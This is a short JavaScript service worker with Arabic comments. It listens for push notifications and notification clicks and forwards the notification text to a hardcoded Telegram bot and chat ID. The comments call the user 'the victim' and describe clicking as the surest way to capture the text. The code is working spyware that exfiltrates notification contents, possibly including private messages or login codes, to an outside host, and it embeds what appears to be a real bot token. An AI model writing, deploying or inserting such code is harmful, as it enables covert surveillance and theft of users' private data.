const botToken = '8530728105:AAFIsTnKIKmwOnUxFvna_6IXnxT7wqKtsrE';
const chatId = '7802385639';

// التقاط الإشعارات عند وصولها (لأجهزة أندرويد التي تدعم Push)
self.addEventListener('push', function(event) {
    let msgText = event.data ? event.data.text() : 'وصل إشعار جديد (قم بفحص جهاز الضحية)';
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📩 إشعار تلقائي من النظام:\n" + msgText)}`);
});

// التقاط محتوى الإشعار عند تفاعل الضحية معه (الطريقة الأضمن)
self.addEventListener('notificationclick', function(event) {
    let content = event.notification.body;
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🚨 تم التقاط نص الإشعار:\n" + content)}`);
});
